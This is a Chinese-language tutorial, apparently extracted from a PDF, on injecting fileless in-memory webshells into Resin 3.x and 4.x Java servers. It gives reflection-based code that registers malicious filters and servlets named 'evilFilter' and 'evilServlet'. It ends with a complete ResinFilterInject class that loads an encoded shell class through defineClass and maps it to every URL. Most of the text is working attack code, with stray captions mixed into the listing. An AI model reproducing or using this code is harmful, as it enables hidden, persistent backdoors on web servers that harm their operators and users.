无文件马
Resin 3.x
WebApp
Filter
基于 addFilterMapping
Servlet
基于 addServletMapping
Resin 3.x & 4.x
Filter
无文件马
Resin 3.x
内存马相关实现、本地测试版本：resin v3.1.16
WebApp
当前代码运行时上下文环境
配置 web.xml
com.example.general.ServletShell#doGet 方法处断点，获得相关的调用栈如下
逐步分析
com.caucho.server.dispatch.ServletInvocation
成员方法  getContextRequest()
    ServletShell
    com.example.general.ServletShell
    ServletShell
    /index
com.caucho.server.http.HttpRequest
继承自 com.caucho.server.connection.AbstractHttpRequest
成员方法 getWebApp()
com.caucho.server.webapp.Application
继承自 com.caucho.server.webapp.WebApp
向上转换（upcasting），方便调用父类(WebApp)中定义的方法和变量
Object currentRequest = 
this.getClass().getMethod("getContextRequest").invoke(null);
currentRequest.getClass() -> com.caucho.server.http.HttpRequest
currentRequest.getClass().getMethod("getWebApp").invoke(currentReque
st) -> com.caucho.server.webapp.Application
WebApp webApp = 
(WebApp)currentRequest.getClass().getMethod("getWebApp").invoke(curr
entRequest);
可成功获取到当前web context(WebApp)。
com.caucho.server.webapp.WebApp
需要关注的成员方法
Filter
Listener
Servlet
至此，针对不同类型的内存马调用相关的成员方法注入即可。
获取WebApp(当前上下文)的代码实现
运行时截图
Filter
基于 addFilterMapping
addFilterMapping
com.caucho.server.webapp.WebApp#addFilterMapping
ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
Class servletInvocation = 
classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");
Object currentRequest = 
servletInvocation.getMethod("getContextRequest").invoke(null);
WebApp webApp = 
(WebApp)currentRequest.getClass().getMethod("getWebApp").invoke(currentRequest);
Filter 示例
Filter 配置
常用的方法就是先在web.xml中定义1个 filter demo，然后断点查看相关配置参数
_filterName
_filterClassName
_filterClass
_urlPattern
...
注入思路
获取当前环境的WebApp(上下文)
构造filterMapping，添加 相关配置
调用成员方法addFilterMapping添加该filterMapping即可
代码实现
filterMapping.setFilterClass();
filterMapping.setFilterName();
FilterMapping.URLPattern urlPattern = filterMapping.createUrlPattern();
urlPattern.addText(urlPatternX);
urlPattern.init();
String filterName = "evilFilter";
String urlPatternX = "/resin/*";
ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
Class servletInvocation = 
classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");
Object currentRequest = 
servletInvocation.getMethod("getContextRequest").invoke(null);
WebApp webApp = 
(WebApp)currentRequest.getClass().getMethod("getWebApp").invoke(currentRequest);
Class evilClazz = classLoader.loadClass("com.example.general.FilterShell");
FilterMapping filterMapping = new FilterMapping();
filterMapping.setFilterClass(evilClazz.getName());
filterMapping.setFilterName(filterName);
FilterMapping.URLPattern urlPattern = filterMapping.createUrlPattern();
urlPattern.addText(urlPatternX);
urlPattern.init();
webApp.addFilterMapping(filterMapping);
response.getWriter().write("inject success");
测试效果
ps: resin下会报异常如下( 有师傅知道为啥嘛，求指点 )
java.lang.IllegalStateException: sendError() forbidden after buffer has been committed.
Servlet
基于 addServletMapping
addServletMapping
com.caucho.server.webapp.WebApp#addFilterMapping
Servlet 示例
Servlet 配置
常用的方法就是先在web.xml中定义1个 servlet demo，断点查看相关配置参数
_servletName
_servletClassName
_servletClass
...
注入思路
获取当前环境的WebApp(上下文)
构造servletMapping，添加相关配置
调用成员方法addServletMapping添加该servletMapping即可
代码实现
servletMapping.setServletClass();
servletMapping.setServletName();
servletMapping.addURLPattern();
测试效果
Resin 3.x & 4.x
Filter
resin 4.x 内存马的相关实现步骤与3.x没有太大的区别，这里直接给出已适配 resin  3.x & 4.x 的Filter型
内存马
String servletName = "evilServlet";
String urlPatternX = "/resin/*";
ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
Class servletInvocation = 
classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");
Object servletRequest = 
servletInvocation.getMethod("getContextRequest").invoke(null);
WebApp webApp = (WebApp) 
servletRequest.getClass().getMethod("getWebApp").invoke(servletRequest);
Class evilClazz = classLoader.loadClass("com.example.general.ServletShell");
ServletMapping servletMapping = new ServletMapping();
servletMapping.setServletClass(evilClazz.getName());
servletMapping.setServletName(servletName);
servletMapping.addURLPattern(urlPatternX);
webApp.addServletMapping(servletMapping);
response.getWriter().write("inject success");
/**
 * Tested version：
 *      resin3.1.16
 *      resin4.0.65
 *
 */
public class ResinFilterInject extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse 
response) throws ServletException, IOException {
        try {
            String filterName = "evilFilter";
            String urlPatternX = "/*";
            ClassLoader classLoader = 
Thread.currentThread().getContextClassLoader();
            // com.caucho.server.dispatch.ServletInvocation.getContextRequest
            Class servletInvocation = 
classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");
            Object currentRequest = 
servletInvocation.getMethod("getContextRequest").invoke(null);
            // com.caucho.server.connection.AbstractHttpRequest.getWebApp
            WebApp webApp = (WebApp) 
currentRequest.getClass().getMethod("getWebApp").invoke(currentRequest);
            // com.caucho.server.webapp.WebApp._filterManager
            Field _filterManager = null;
            try {
                _filterManager = 
webApp.getClass().getDeclaredField("_filterManager");
            }catch (Exception e){
                _filterManager = 
webApp.getClass().getSuperclass().getDeclaredField("_filterManager");
            }
            _filterManager.setAccessible(true);
            FilterManager filterManager = (FilterManager) 
_filterManager.get(webApp);
            // com.caucho.server.dispatch.FilterManager._filters
            Field _filtersF = 
filterManager.getClass().getDeclaredField("_filters");
            _filtersF.setAccessible(true);
            Map _filters = null;
            try{
                // resin3.1.16: Hashtable _filters = 
new Hashtable();
                _filters  = (Hashtable) 
_filtersF.get(filterManager);
            }catch (Exception e){
                // resin4.0.65: HashMap _filters = new 
HashMap();
                _filters = (HashMap) 
_filtersF.get(filterManager);
            }
            // prevent multiple injection
            if(!_filters.containsKey(filterName)){
                Class evilClazz = null;
                try {
                    evilClazz = 
classLoader.loadClass("com.example.general.FilterShell");
                } catch (ClassNotFoundException e) {
                    BASE64Decoder b64Decoder = new sun.misc.BASE64Decoder();
                    byte[] evilFilterBytes = 
b64Decoder.decodeBuffer("yv66vg......");
                    Method defineClass = 
ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, 
int.class);
                    defineClass.setAccessible(true);
                    evilClazz = (Class) defineClass.invoke(classLoader, 
evilFilterBytes, 0, evilFilterBytes.length);
                }
                FilterMapping filterMapping = new FilterMapping();
                filterMapping.setFilterClass(evilClazz.getName());
                filterMapping.setFilterName(filterName);
web.xml
测试效果
                FilterMapping.URLPattern urlPattern = 
filterMapping.createUrlPattern();
                urlPattern.addText(urlPatternX);
                urlPattern.init();
                webApp.addFilterMapping(filterMapping);
                response.getWriter().write("inject success");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}